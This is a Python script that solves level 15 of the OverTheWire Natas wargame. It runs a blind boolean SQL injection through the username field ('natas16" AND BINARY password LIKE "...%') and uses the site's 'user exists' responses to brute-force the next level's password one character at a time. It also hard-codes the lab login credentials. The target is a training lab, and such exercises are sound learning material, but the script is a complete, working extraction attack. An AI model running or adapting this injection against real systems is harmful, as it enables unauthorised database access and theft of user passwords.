import re
import requests
import string

level = 15
creds = ('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

char_set = string.ascii_lowercase[:26]+string.ascii_uppercase[:26]
for i in range(10):
	char_set+=str(i)

print(char_set)
password = ''
cur_password=''
prev_password='X'
#Injection => natas16" AND password LIKE "a%  ,This user exists. ,  This user doesn't exist.

#formdata = {'username':'fill ut u','submit':'Check existence'}
i = 0
while(True):
	
	if cur_password != prev_password:
		prev_password = cur_password
		cur_password = password
	else:
		break
	
	print("Found Till Now => " + password)
	for ch in char_set:
			temp_password = password+ch
			injection='natas16" AND BINARY password LIKE "'+temp_password+"%"
			#print(injection)
			formdata = {'username':injection,'submit':'Check existence'}
			response = session.post(url,auth=creds,data=formdata)
			data = response.text
			if "This user exists." in data:
				password = password+ch
				cur_password = password

			elif "This user doesn't exist." in data:
				temp_password = ''

			else:
				#print(data)
				pass


print(password)